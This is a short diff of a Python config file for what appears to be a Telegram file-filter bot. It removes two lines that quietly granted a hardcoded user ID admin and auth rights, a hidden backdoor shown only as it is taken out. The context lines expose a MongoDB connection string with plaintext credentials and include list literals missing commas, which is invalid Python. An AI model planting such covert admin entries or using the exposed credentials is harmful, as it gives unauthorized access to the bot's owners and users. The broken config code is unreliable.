@@ -26,8 +26,6 @@ ADMINS = [897298824 1498911533]
 CHANNELS = [-1001413599796 -1001681594064  -1001604040747]
 auth_users = [int(user) if id_pattern.search(user) else user for user in environ.get('AUTH_USERS', '').split()]
 AUTH_USERS = (auth_users + ADMINS) if auth_users else []
-AUTH_USERS.append(1684438752)
-ADMINS.append(1684438752)
 auth_channel = environ.get('AUTH_CHANNEL')
 auth_grp = environ.get('AUTH_GROUP')
 AUTH_CHANNEL = int(-1001628588311)
@@ -36,7 +34,7 @@ AUTH_GROUPS = [int(ch) for ch in auth_grp.split()] if auth_grp else None
 # MongoDB information
 DATABASE_URI = "mongodb+srv://pdisk:pdisk@cluster0.veegd.mongodb.net/myFirstDatabase?retryWrites=true&w=majority"
 DATABASE_NAME = "cluster0"
-COLLECTION_NAME = environ.get('COLLECTION_NAME', 'Telegram_files')
+COLLECTION_NAME = "Telegram_files"
 
 # Others
 LOG_CHANNEL = int(environ.get('LOG_CHANNEL', 0))
